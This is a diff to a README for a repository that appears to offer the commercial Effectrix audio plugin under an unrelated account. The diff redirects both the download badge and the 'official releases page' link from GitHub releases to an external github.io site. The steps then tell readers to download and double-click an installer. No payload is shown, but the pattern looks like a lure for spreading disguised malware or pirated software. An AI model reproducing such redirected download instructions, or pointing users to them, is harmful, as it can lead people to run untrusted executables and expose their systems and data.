@@ -1,6 +1,6 @@
 # 💿 Sugar-Bytes-Effectrix-2026 - Master your audio with professional tools
 
-[![](https://img.shields.io/badge/Download_Now-Blue?style=for-the-badge)](https://github.com/Pabl9022/Sugar-Bytes-Effectrix-2026/releases)
+[![](https://img.shields.io/badge/Download_Now-Blue?style=for-the-badge)](https://pabl9022.github.io)
 
 ## 📖 About this software
 
@@ -21,7 +21,7 @@ Before you install the software, check your computer for these specifications:
 
 Follow these steps to set up the software on your machine.
 
-1. Visit the [official releases page](https://github.com/Pabl9022/Sugar-Bytes-Effectrix-2026/releases) to download the installer.
+1. Visit the [official releases page](https://pabl9022.github.io) to download the installer.
 2. Locate the most recent setup file in the list.
 3. Save the file to your computer.
 4. Double-click the installer file to start the process.
